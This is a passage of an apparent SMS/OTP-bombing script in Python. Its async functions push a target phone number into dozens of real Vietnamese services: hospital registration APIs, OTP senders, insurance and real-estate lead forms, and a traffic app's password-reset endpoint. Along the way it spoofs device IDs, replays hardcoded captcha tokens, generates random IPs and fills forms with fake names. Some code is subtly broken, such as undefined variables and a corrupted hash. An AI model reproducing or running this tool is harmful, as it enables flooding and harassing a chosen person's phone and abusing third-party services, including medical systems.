                'screen_height': '844',
                'screen_width': '390',
                'sdkVersion': '1.0',
                'unique_device_id': device_token,
                'use_pin': '1',
                'user_type': '0',
                'version': '3.6.179',
            },

        )
        print(f"kaka8/be | -> OK -> ")
    except Exception:
        print(f"kaka8/be | ~> Lỗi ")


async def pvi(phone):
    try:

        response = await make_request('POST', 
            'https://qlcd.pvi.com.vn/API_App/ManagerPviMobile/kiemtra_tkMyPVI',
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Cache-Control': 'no-cache',
                'User-Agent': 'My%20PVI/184 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Content-Type': 'application/json',
                'Cookie': 'BNI_persistence=RQXOLn0d07OUrfZBa92bEA8IfEMtBEe67HClbEbYkf3LrjBOD6zriRJe7DCILFU8g9baRdhm7-tBHvQUAVrcDQ==',
            },
            json={
                'dien_thoai': phone,
                'Android_version': '501.0',
                'loai_OS': '1',
                'IOS_version': '0',
                'CpId': '1',
                'Sign': '0e1e105285dee5ebb5f95f01662f7711',
            },

        )
        print(f"PVI | -> OK -> ")
    except Exception:
        print(f"PVI | ~> Lỗi ")


async def isofhcare_dongda(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://api-produce.isofhcare.com/isofhcare/user/register',
            headers={
                'devicetype': 'mobile',
                'Accept': 'application/json, text/plain, */*',
                'appversion': '18.18',
                'source': 'bvdkdongda',
                'Accept-Language': 'vi-VN,vi;',
                'deviceos': 'ios 18.1',
                'Content-Type': 'application/json',
                'deviceid': str(uuid.uuid4()).upper(),
                'User-Agent': 'BVDKDongDa/18 CFNetwork/1568.200.51 Darwin/24.1.0',
                'mobilemode': 'user',
            },
            json={
                'user': {
                    'name': '',
                    'password': __import__('hashlib').md5(''.join(random.choices(string.ascii_letters + string.digits, k=10)).encode()).hexdigest(),
                    'role': 1,
                    'telephoneNumber': {'number': phone_fmt, 'dialingCode': '+84'},
                },
                'isofhcareCode': '',
                'socialType': 1,
            },

        )
        print(f"isofhcare_dongda | -> OK -> ")
    except Exception:
        print(f"isofhcare_dongda | ~> Lỗi ")


async def isofhcare_daihocyhanoi(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://api-datkhamvatraketqua.benhviendaihocyhanoi.com/isofhcare/user/register',
            headers={
                'devicetype': 'mobile',
                'Accept': 'application/json, text/plain, */*',
                'Authorization': '',
                'appversion': '86.0.0.338',
                'source': 'benhviendaihocyhanoi',
                'Accept-Language': 'vi-VN,vi;',
                'deviceos': 'ios 18.1',
                'Content-Type': 'application/json',
                'deviceid': str(uuid.uuid4()).upper(),
                'User-Agent': 'DaiHocY/338 CFNetwork/1568.200.51 Darwin/24.1.0',
                'mobilemode': 'user',
            },
            json={
                'user': {
                    'name': '',
                    'password': __import__('hashlib').md5(''.join(random.choices(string.ascii_letters + string.digits, k=10)).encode()).hexdigest(),
                    'role': 1,
                    'telephoneNumber': {'number': phone_fmt, 'dialingCode': '+84'},
                },
                'isofhcareCode': '',
                'socialType': 1,
            },
        )
        print(f"isofhcare_daihocyhanoi | -> OK -> ")
    except Exception:
        print(f"isofhcare_daihocyhanoi | ~> Lỗi ")


async def isofhcare_bvchoray(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://api-produce.isofhcare.com/isofhcare/user/register',
            headers={
                'devicetype': 'mobile',
                'Accept': 'application/json, text/plain, */*',
                'appversion': '107.107',
                'source': 'bvchoray',
                'Accept-Language': 'vi-VN,vi;',
                'deviceos': 'ios 18.1',
                'Content-Type': 'application/json',
                'deviceid': str(uuid.uuid4()).upper(),
                'User-Agent': 'BvChoRay/107 CFNetwork/1568.200.51 Darwin/24.1.0',
                'mobilemode': 'user',
            },
            json={
                'user': {
                    'name': '',
                    'password': __import__('hashlib').md5(''.join(random.choices(string.ascii_letters + string.digits, k=10)).encode()).hexdigest(),
                    'role': 1,
                    'telephoneNumber': {'number': phone_fmt, 'dialingCode': '+84'},
                },
                'isofhcareCode': '',
                'socialType': 1,
            },
        )
        print(f"isofhcare_bvchoray | -> OK -> ")
    except Exception:
        print(f"isofhcare_bvchoray | ~> Lỗi ")


async def isofhcare_etw(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    try:

        response = await make_request('POST', 
            'https://api-produce.isofhcare.com/isofhcare/user/register',
            headers={
                'devicetype': 'mobile',
                'Accept': 'application/json, text/plain, */*',
                'appversion': '30.0.33',
                'source': 'benhvienetw',
                'Accept-Language': 'vi-VN,vi;',
                'deviceos': 'ios 18.1',
                'Content-Type': 'application/json',
                'deviceid': str(uuid.uuid4()).upper(),
                'User-Agent': 'BenhVienE/33 CFNetwork/1568.200.51 Darwin/24.1.0',
                'mobilemode': 'user',
            },
            json={
                'user': {
                    'name': '',
                    'password':                    '27d6c80e15f269f4aàcb2bd0a4bc4f7f',
                    'role': 1,
                    'telephoneNumber': {'number': phone_fmt, 'dialingCode': '+84'},
                },
                'isofhcareCode': '',
                'socialType': 1,
            },
        )
        print(f"isofhcare_etw | -> OK -> ")
    except Exception:
        print(f"isofhcare_etw | ~> Lỗi ")


async def hi1(phone):
    try:

        response = await make_request('POST', 
            'https://admin.hi1.vn/api/v1/otp/send-otp',
            headers={
                'Content-Type': 'application/json',
                'Origin': 'https://hi1.vn',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi',
                'User-Agent': 'runner/2 CFNetwork/1568.200.51 Darwin/24.1.0',
            },
            json={'phone': phone, 'hash': 'b7108efbafd84dcc8160f12488acfb65'},

        )
        print(f"hi1 | -> OK -> ")
    except Exception:
        print(f"hi1 | ~> Lỗi ")


async def coop(phone):
    try:

        response = await make_request('POST', 
            'https://identity.tekoapis.com/api/v1/users/register',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'Co.op%20Online/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={
                'username': phone,
                'client_id': 'db505ddf57834f4f94003ec7ea71979c',
                'password': 'Trongok@288',
            },

        )
        print(f"Co.op | -> OK -> ")
    except Exception:
        print(f"Co.op | ~> Lỗi ")


async def vitadairy(phone):
    try:
        user_id = random.randint(1000000000000000000, 9999999999999999999)
        ts = int(time.time())

        response = await make_request('POST', 
            'https://aiqua-sdk.c.appier.net/qga/6d5de2cddcb6cb9379f8/data/',
            headers={
                'Accept': '*/*',
                'appSecret': '28dd5f1fb414f712c3356fe8bf9ff686607f33e007c65b54b1ea4e78b42d7868',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Content-Type': 'application/json',
                'User-Agent': 'vitadairy/222 CFNetwork/1568.200.51 Darwin/24.1.0',
                'algorithm': 'SHA256',
            },
            json={
                'profiles': {
                    'aiq_push_enabled': True,
                    'sdkVersion': '8.4.2',
                    'aiq_geofencing_capable': False,
                },
                'userId': user_id,
                'device': 'ios',
                'events': [
                    {
                        'uuid': str(uuid.uuid4()).upper(),
                        'eventName': 'app_launched',
                        'qgts': ts,
                    },
                    {
                        'parameters': {'pr_event_group': 'account'},
                        'eventName': 'ev_account_click_registration',
                        'qgts': ts + 2,
                        'uuid': str(uuid.uuid4()).upper(),
                    },
                    {
                        'uuid': str(uuid.uuid4()).upper(),
                        'eventName': 'ev_account_registration_potential_phone',
                        'qgts': ts + 4,
                        'parameters': {
                            'pr_event_group': 'account',
                            'pr_registration_method': 'SMS',
                            'pr_registration_potential_phone': phone,
                        },
                    },
                ],
            },
        )
        print(f"VitaDairy | -> OK -> ")
    except Exception:
        print(f"VitaDairy | ~> Lỗi ")


async def avakids(phone):
    device_id = str(uuid.uuid4()).upper()
    try:
        response = await make_request('POST', 
            'https://wsavakids.tgdd.vn/mwg-app-avakids-profile-service/oauth/token',
            headers={
                'Accept': 'application/json',
                'Authorization': 'Basic bXdnLWFwcC1hdmFraWRzOjk3I3F3WV5CaHV2bFB4bDdzQGdpYyoxbGp4',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'avakids/111 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data={
                'grant_type': 'password',
                'username': phone,
                'password': '',
                'os': 'ios',
                'device_id': device_id,
                'deviceName': 'iPhone',
            },
        )
        access_token = token_resp.json().get('access_token')
        if not access_token:
            print(f"AvaKids | X (token) [{token_resp.status_code}] -> ")
            return

        response = await make_request('POST', 
            'https://wsavakids.tgdd.vn/mwg-app-avakids-profile-service/graphql',
            headers={
                'siteid': '17',
                'x-version-app': '2.0.18',
                'User-Agent': f'iOS||18.1||{device_id}',
                'device_id': device_id,
                'customerid': '0',
                'accesstoken': access_token,
                'os': 'ios',
                'apollographql-client-name': 'AVAKIDS',
                'apollographql-client-version': '2.0.18',
                'deviceid': device_id,
                'platform': '2',
                'provinceid': '1027',
                'Authorization': f'Bearer {access_token}',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'username': phone,
            },
            json={
                'operationName': 'sendSMSOTP',
                'variables': {'isOnlySMS': 0},
                'query': 'mutation sendSMSOTP($isOnlySMS: Int) {\n  sendSMSOTP(isOnlySMS: $isOnlySMS) {\n    isError\n    message\n    expireTime\n    __typename\n  }\n}',
            },
        )
        print(f"AvaKids | -> OK -> ")
    except Exception:
        print(f"AvaKids | ~> Lỗi ")


async def camkhe_tuvan(phone):
    import random as _rnd, re as _re
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    ho = _rnd.choice(['Nguyễn','Trần','Lê','Phạm','Hoàng','Phan','Vũ','Đặng','Bùi','Đỗ'])
    ten = _rnd.choice(['Minh','Hùng','Lan','Hoa','Tuấn','Nam','Linh','Anh','Hải','Dung','Mai','Trang'])
    name = f"{ho} {ten}"
    email = f"{ten.lower()}{_rnd.randint(10,9999)}@gmail.com"
    try:

        response = await make_request('GET', 'https://camkhecentralpark.com.vn/',
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
            },
        )
        nonce_m = _re.search(r'"nonce"\s*:\s*"([a-f0-9]+)"', r.text)
        nonce = nonce_m.group(1) if nonce_m else '0909474bc3'

        response = await make_request('POST', 
            'https://camkhecentralpark.com.vn/wp-admin/admin-ajax.php',
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://camkhecentralpark.com.vn',
                'Referer': 'https://camkhecentralpark.com.vn/',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data={
                'action': 'elementor_pro_forms_send_form',
                'referrer': 'https://camkhecentralpark.com.vn/',
                'post_id': '213',
                'form_id': 'e4de914',
                'queried_id': '213',
                'el_id': 'e4de914',
                '_nonce': nonce,
                'form_fields[name]': name,
                'form_fields[field_f04b0cf]': phone_fmt,
                'form_fields[field_759af51]': email,
            },
        )
        print(f"CAMKHE | -> OK -> ")
    except Exception:
        print(f"CAMKHE | ~> Lỗi ")


async def edufin_tuvan(phone):
    import random as _rnd, re as _re
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    ho = _rnd.choice(['Nguyễn','Trần','Lê','Phạm','Hoàng','Phan','Vũ','Đặng','Bùi','Đỗ'])
    ten = _rnd.choice(['Minh','Hùng','Lan','Hoa','Tuấn','Nam','Linh','Anh','Hải','Dung','Mai','Trang','Bình','Long'])
    lop = _rnd.choice(['10','11','12','Đã tốt nghiệp'])
    khu_vuc = _rnd.choice(['Hà Nội','TP. Hồ Chí Minh','Đà Nẵng','Hải Phòng','Cần Thơ','Khác'])
    ngay = str(_rnd.randint(1, 28))
    thang = str(_rnd.randint(1, 12))
    nam = str(_rnd.randint(2005, 2010))
    noi_dung = _rnd.choice(['Tư vấn học phí','Tư vấn chương trình học','Thông tin tuyển sinh','Học bổng','Khác'])
    khung_gio = _rnd.choice(['8h-10h','10h-12h','13h-15h','15h-17h','17h-19h'])
    try:

        response = await make_request('GET', 'https://admissions.edufin.vn/',
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
            },
        )
        nonce_m = _re.search(r'name=\"_contact_form_nonce\"\s+value=\"([^\"]+)\"', r.text)
        nonce = nonce_m.group(1) if nonce_m else 'ed283006a3'

        response = await make_request('POST', 
            'https://admissions.edufin.vn/wp-admin/admin-ajax.php',
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://admissions.edufin.vn',
                'Referer': 'https://admissions.edufin.vn/',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data={
                'action': 'save_form_information',
                '_contact_form_nonce': nonce,
                'dashboardd_contact_honey': '',
                'name': f"{ho} {ten}",
                'phone_number': phone_fmt,
                'lop_dang_hoc': lop,
                'khu_vuc': khu_vuc,
                'ngay': ngay,
                'thang': thang,
                'nam_sinh': nam,
                'noi_dung': noi_dung,
                'khung_gio_lien_he': khung_gio,
            },
        )
        print(f"EDUFIN | -> OK -> ")
    except Exception:
        print(f"EDUFIN | ~> Lỗi ")


async def sunlife_tuvan(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    import random as _rnd, datetime as _dt
    ho = _rnd.choice(['Nguyễn','Trần','Lê','Phạm','Hoàng','Huỳnh','Phan','Vũ','Võ','Đặng'])
    ten = _rnd.choice(['Minh','Hùng','Lan','Hoa','Tuấn','Nam','Linh','Anh','Hải','Dung','Thắng','Mai','Trang','Bình'])
    name = f"{ho} {ten}"
    email = f"{ten.lower()}{_rnd.randint(100,9999)}@gmail.com"
    ecid = ''.join([str(_rnd.randint(0,9)) for _ in range(38)])
    _now = _dt.datetime.now(_dt.timezone.utc)
    fill_date = _now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{_now.microsecond // 1000:03d}Z"
    try:

        response = await make_request('POST', 
            'https://online.sunlife.com.vn/api/prd/partner-facade/public/lead',
            headers={
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Origin': 'https://www.sunlife.com.vn',
                'Referer': 'https://www.sunlife.com.vn/',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            json={
                'name': name,
                'phone': phone_fmt,
                'email': email,
                'city': _rnd.choice(['TP. Hà Nội', 'TP. Hồ Chí Minh', 'TP. Đà Nẵng', 'TP. Hải Phòng', 'TP. Cần Thơ']),
                'product': _rnd.choice(['Đầu tư', 'Bảo vệ sức khỏe', 'Bảo vệ tai nạn', 'Tiết kiệm giáo dục', 'Bảo vệ cuộc sống']),
                'PII1': 'true',
                'P12': 'true',
                'lang': 'Vietnamese',
                'leadsource': 'website',
                'o2o-product': 'null',
                'platform': '',
                'referrer': 'https://www.google.com/',
                'parentPage': 'https://www.sunlife.com.vn/vn/ve-chung-toi/lien-he/dang-ky-tu-van-ph1-edu/',
                'fillDate': fill_date,
                'trafficSource': 'organic%2Fnatural+search',
                'deviceType': 'iPhone',
                'deviceOS': 'iPhone',
                'browser': 'Safari',
                'ecid': ecid,
                'campaignID': '',
                'geo': '',
            },
        )
        print(f"SUNLIFE | -> OK -> ")
    except Exception:
        print(f"SUNLIFE | ~> Lỗi ")

_GT365_CAPTCHA_REGISTER = (
    "0cAFcWeA5V0KKBR1dhsWQqK2M6YSWs9FjusR55_7wn9quvFPGuNvvLPNfZ2tFm8syPqwNhlhN7IwOmRYVVgaubs3SAsoHnCzVS79G7YKk"
    "L8e394Nda1yQohnRzt7SC7CN_C5MO5xUKcYNB9J9wnX4jA9l2BJeApy3NzAZA5ygsUeAKaj6lr3Gii7NtZEn814yoWTLOxCnPzTsmvWIDa"
    "_OhRkZbQqqxGPUVIk574DDxPBd2biM-LvbczoVLMuIh97Vd8ac3Cy5PQ95hPfkx7Fd2CxG_lVK9ipnwli3cJuO10w9_-zZlRv5Ikc-08f"
    "RsnJ1qRHU1hDRqz2ll284qOiGFOWqP8XDeRXEvkzf3MD9_udwGmTDhPQnX6_rWE7L03q1XGJf_K0ILdxuG0gBJS_R1Tpfxvr9B4UmkI_Y"
    "OJZHY2JWW2jbbXQ_2TqJ5ZKjbhEu0QJcr7Pgm4jTR8YlUv-D6PjsiAJd8CTmEzy0FG0xzTx-f1a1K5MPsRcxbTbGu24WTvrcX6lq4WsXY"
    "dGotfi_amW4x4UbiGObjrxl_iltc5Gaoo5vBzevalidkxC2m0sIVSWV3JkaQTFgnmWZD550eMGOE9gHwPj744cl4evNU0kWEl-OMDXrd8GW"
    "dz_h_bQuSgIYJCjvsquZSL0b3org-QekrfpoRWMcWbDUlpR05rOZjnLZLN1t3VN_qn44-hQJI9oHZCh3-f4sxvKSSFLXgjQd-i55b-2NOi"
    "pWaysGpATOuWNTuHJk6GPe88tXtJc05UcfDhe2MgBaz-IzWsuX0SwIpSsAKUAG8yiAFH9W1xj64mvEHIS1V1GKcXXoOMYYHT0HUVC8Rat5"
    "PBAwI5wu4NdGK3WSiy9DTeJ0UuQVCZt4RHP5XwmSXva1gkGEun-VQqNE4QrY6TQtBcL3PZO8I6znN6JVc00fquT85FAbXCE1XhHYjgO6e"
    "sWAMbHQXDRxBLA7IT_t7xfk3jn7yxVSfTIdEw0EMnQzl-xLJItcaUTErFKgql338xkvdwchWZT7dqz2vhQB1J9Isy5dCvagOocPgh0wHY"
    "K6QHXI7_36N1pnMN4T-O5AAOY4VMxONh8DPKVAWOUuavwP498De1DqX8pPRcAqAyGP5JTslaHPvOZ6M3ZAM8rVdakW90mowyrFiMulnjn"
    "Jb_qovVYS7ogdcmqhUPXZWFeMOfOXI6GPAL71W3p5A9YOGBqdVBI27pxTE0PbTfqC9wIJ8iDXV2y0AsRFI7wGXf1a73BlpBEWx158Y8Gy"
    "d9-itgb3A25pNHIy7Xc4pf2EpnPjiQKy4Ti30BjML4MWNhEExMlLOyOuFiAIlchaBZVEim7GFOhB65ZIgzOS-MU5FNJGYEU9NDA6YbJ6M"
    "8W8RrthHo440s4oJP7P_DxD6CbnGJwARlF9d8lSXeRvvRUI6e_8GK2M_PlMNEEgsJ-fKc3jPdpeY5CpU9p-BDJWv-EPKoHjPkiEiqZKkH"
    "4r6P5764Ry5cd1uLB2Wshrso_xBqUr0A33c9mIF7sGR7o2dLrXvBRKgiVImWaCtKSHEGLV8_fmeyjXqjNbtquscLYqQMo5oeez7St56kUK"
    "9Mxl27zMPiMBqtr6QXakuuHFehHqW0e1RJaseIktPESIKq6fKP8ATUYT2X2ZXv5IFdnj-wSljPEMNQlaabwrkEs99UjopZXOajzl-kMZgn"
    "CxgcoHQs6CcKhlW3L9lQYDMg0UtswFq1m1a0ED5KI6HJfb0nFN3HAcuQFo1SZGtwVZXbbxoAzde_36CMis2rDz99My0vnX4ozdcNN0vk13"
    "2rfKG5_uc0L_AbaeXIbe-Fc6x9hSl4gvMDqGjzC8jbQt-NbG6nQpqZeJtkzdcVHPSzgebuE5jtTFAfXr92n9jTMwMZEsGnP-UruYExC7t"
    "uKwUBzOK01LjjTNgR3SMO3OjfginYJhSSnoplGG2b8rUhuJRXQC7x6K9lnxuILGZtj0EOTUTRHdiJmR_CXaj5U-fvZbB7zWJvn3N8fWBQ"
    "dJhZqz0_xNCLDg_ZDVFoUBYugnHdHZ-Kb9jbh5iNliIm9X6VoGAquBYaflmGvp3Da-auS1Izr4pRsmop5TvO-L0SgyBUUhXp9q5g8K7_y"
    "s-WcechwMe8q2sqqGzKOqD7NJ6VayVS6h0c253_yOe7lFNHKkNGx1NtKU-Rl1UppRaHctQabDLXVhopmoiczePW-i82nc51EDLQE2XNm9O"
    "ZE4ebAc1FVSd46Reocj-TeyWw0kQoUd8c_BQaDZpTDDCTKvxwqA9HHXWTx8X1n0_Mrboqs2rtyFNS_tUfdxfn1h9FiyKCnh-m5HSSErYo"
    "onqsEYEh2E3TTg-u2h6rOnda0098oLo_0d8zJGCtWW9nolKWY17ihDYp4-45gTW3k8-UIGxbN0WanZmxUmeb509D-bqRJbNwbmTa7Yd4GX"
    "q5uIVyUjOFj6CeA2soktM78gfnZKy_2F0bCF1ZLHK9zcZDJwar0C2t0LywmVgIm5YudMXcbQ3GUiT9qycrenPxo8UZBuHFhR3cHdFLRdY"
    "0h6ADlzYmQ9iaHmVBawuhRA"
)

_GT365_CAPTCHA_FORGOT = (
    "0cAFcWeA6PyOWMfahX_TCH8DNAitRIiEEElFjBSAg-SFDD6eyztRm9q0nvtL-2eJTXXsXPSX-hlUBVvs_qNgnzBFJiS8ujc4L3KkhnhHNQ"
    "bFSel-X9ktIgHpiRS7JVwtB6wW5uVaYRrXVxmFGwox9tbCtVVoyIVgRKjGtpZaWcmPF1hgRYcGx31PrO_JsHeLHqzBo8MactK3UjflxAy"
    "PhCtkVCMwoJyx5DGv3w9hjzLa8NV1OIrD7ux2vPFcZ8vhcL-sKqkY9gmgF5rKsyJZxXC939B4ezVfYpInEkV64SI7eJHhxmQ0HpoBuGu5"
    "a9M1R8UAvjj38Y09weIn_TPyZ-RgDE80CUKDvazvskLP4kfJ-knHyQNsuspLf2umu-Xoohz2IhSMC9EUTeBTv_lgWqCEbGgpxplGUpKMNm"
    "7vCEtQw744CDgVubJ4Cmq9ACWFDFO4lIihCTxmMzwIBc4xTxIPdu1I32KAN74yXZ14gAFyvea_kA0b7gWNh3VvGlhg3ZVpMbNzQqeplnTI"
    "lrt5CVa6m0wj4hG4xINfPKDRFeBYIipyHFk-I1Oq4ckAbt_Mr1WjmW2aaurTPR020LwKjyD2J_ZR45YOwX1Q7H7H9eAmRdyq8pucDWu0P"
    "ianMpcHPVAfcXcxJJiF0YtBZ3WXfSp4Yr9S7PLhiXNasAS_NDj4lGQ0XXKxzq5K3sJyQr9SGyodwRGnBw63f4uYvz0GhNvB4-hFAcNDvi"
    "jV5O0QpMxfmhdyzw9nzD4RfkLtgoXukANAwX5cFjoCSyZV10-TcFOcimavQyz4YXD47MiagDqnpcUSpSWvqv4RUbJVm4H_AFTtU46IcoaN"
    "3hUqNiyotHk5ZbM_PsMIUWCiUkiPrnz1QLKMQ1QvJXjQHEOBU4Lylc3RQqMbRMG8KLpsaEjBbzVroYticfhW-41jQzgMsJbmfs7MUj7VR"
    "G2WL3k7YoT-fR1ttvhuDCKO2UNCaLcKZNI9UJSDQqndaniLeSReiREIToL0BckvOay3vV8JdeZ7wklQuwPDGxAtbZ6fZwz8zCud8yh0bL6"
    "n_5AdWmoWHN-ye5CnSfFAU3QJ7CjwxEtJ91H_cg--N4EoF-PXdsIKOhJHAgjgiT_rwId8YGQJ22pSwSwB_zkGEqeZI2TBuyTf8aQY4euO"
    "jY-E1QpP4JQ82Mra7X4ClUYmAd_7n7KYXq3SUPvhScROoGtYAWeJiFwlxL8z5OfQlqtMgqsjgJK8N14SCNPaTJ9Ihep2sP1rQ0CPxVdqW"
    "px-9Gtgq1WgApzZfuhjJp3U6EmOtAnqloptAkEhGAV_2gzVkA4eIXil5uBr_l7VEZTnUBVDoAeUo0IpXnARsgD7RuL86s1ZCEJvaE3kI1"
    "vYzIG-atF9iRzmYoFQd7jk4jZ7NZ-qDvEliSbm2cjwUPQpKTQcY_P5BV6krGQlDVl9wGq0w56KdZV8HH2Q4-EzwotdrjEMUmVJdzCcVDR"
    "1DxSSUJPgJD8m0OcDdkv3gum3PFkyj0AsPt7WLMZEHZy2J2krkvWa2-w8mj1bgoTwZ4_KbmcHMS-LcwjvSjv0044zo_aistTH1tsT5ygp"
    "N5iKf7_4fhk9-RXmUVyFWkqJLamDjFBW7QENDkuoJ_B4ePuz2ZSyOIf_9iLeLtiWXiSOZ8JpfAm5JC0SfA_hVh3TjqdbJw5VsnXTSXq0"
    "wDgYBr0oJhAjc_9zag-71RWkyfEERdiDyaYhtX623dATTW6U1aQ0N2jvDWf0GavJS7sshWxrZU1FWWZGxCd2ZOvxbG7uC53_f1sATk4fR"
    "XHSD2gHVAdp6ZEn7-oIJMvsRt7GOWMNJEPSeU3EARM2MCmIo4GAhOuEyE1UKO6UKVjwmZnSPOCUd1icnzViPo1ShfLlPg7r1IBRT9bcwQ"
    "1cfGFl-giNKCbK1jiId0_yD8KMfPIp2EyiQGTBcuf7qmmv3kM7_bR31uWG-0dA1-gZRuApjWDbjjqDLJ1KcX5BMpxeNho8t1fhFPPemS2"
    "_AdJSF06pLkYSnLG4ck2zw57XuLTIvREB3OtUBEovyNlSkPhwlFcc3oJwZcWwK4KlirSYJ-wYwZksiKYuErvpuEYqmfv1MZkkWNJBIN1s"
    "33ePAH_-LxTnFhLWiGhLQkr1l2BWABNIWRmUZeTU__WDshl_EeAWglfJQ0p_nVl8SuSmOn6UOmhZaHWhCGSh9Lnlx7gYlG2zHEREzJqUm"
    "08UbQr8ffE3Gd-bl45dvUpq0TKxjxXA1-D0NYqOsjZ9b-vzmBTd-J7eq3oA58m9aCHXmKzuls_A9tWL49qKY6Yjf_O-sImItPUQ1Jo_J0"
    "5EQr4IOpWDjqoGVRpjK5U2fXS0xDi46WZzpJ8_gQX5rcLawJNlB-_Hr7MZYvZTVM1hBpIh7LNvvCL63b9YX2gf0goL9ao1yZyP4QOoBwH"
    "deNxIBFFRG7rrU0gwnOFMY0cryq-vHmYuvaCMS0j5vLKRcoMoLQzqD24EWJ1XKD_gDGaIjnL3dJJbemWLytx3wALBwHBuubBhJSvseJr7"
    "a4HHGTUwnwlDNOFWmnpukL7_uM8FvcEv3AekB-iQZj_RrqU5QiQVjUdgc0GGs88Hl-DYG9IIqrooK6hVYtHIFG4K_7JiMX0EnvijNn94H"
    "sd_0N1rgwCl6CMUBwPCjUXDLCrOQkzjoNuSAeOEQMj4fUS4KwNtlf4vfPbjgEadnCVu8adXxZ16pDIHK8WA1MOym2pEq8zEZwX3rhMX6y"
    "hnObyzctSxzRccUjFF6J9S2Qk9AqX_iPZsbmMWFXYm9JPN8eYiWRmw"
)


def _gt365_headers(device_id):
    return {
        'Accept': 'application/json,text/plain,text/html',
        'X-Client-Model': 'iPhone 12 Pro',
        'X-Client-Version': '18.1',
        'X-Client-OS': 'iOS',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Trafic365/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'X-Device-Id': device_id,
        'X-App-Version': '2.0.3',
    }


async def giaothong365_register(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    try:
        response = await make_request('GET', 
            'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
            headers=_gt365_headers(device_id),
        )

        response2 = await make_request('PUT', 
            'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/register/request-otp',
            headers=_gt365_headers(device_id),
            json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_REGISTER},
        )
        print(f"GT365-Register | -> OK -> ")
    except Exception:
        print(f"GT365-Register | ~> Lỗi ")


async def giaothong365_forgot(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    try:
        response = await make_request('GET', 
            'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
            headers=_gt365_headers(device_id),
        )

        response2 = await make_request('PUT', 
            'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/forgot-password/request-otp',
            headers=_gt365_headers(device_id),
            json={'phoneNumber': phone_fmt, 'captchaToken': _GT365_CAPTCHA_FORGOT},
        )
        print(f"GT365-Forgot | -> OK -> ")
    except Exception:
        print(f"GT365-Forgot | ~> Lỗi ")


def build_headers(origin):
    return {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": origin,
        "Referer": origin + "/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Accept-Language": "vi-VN,vi;q=0.9",
    }

def get_random_ip():
    import random as _r
    return f"{_r.randint(1,254)}.{_r.randint(0,254)}.{_r.randint(0,254)}.{_r.randint(1,254)}"

def get_random_ipv6():
    import random as _r
    return ":".join(f"{_r.randint(0,65535):04x}" for _ in range(8))


async def call8(phone):
    headers = build_headers("https://ios-h5.marttimeassrt.com")
    payload = {
        "country_code": "vi",
        "phone": phone,
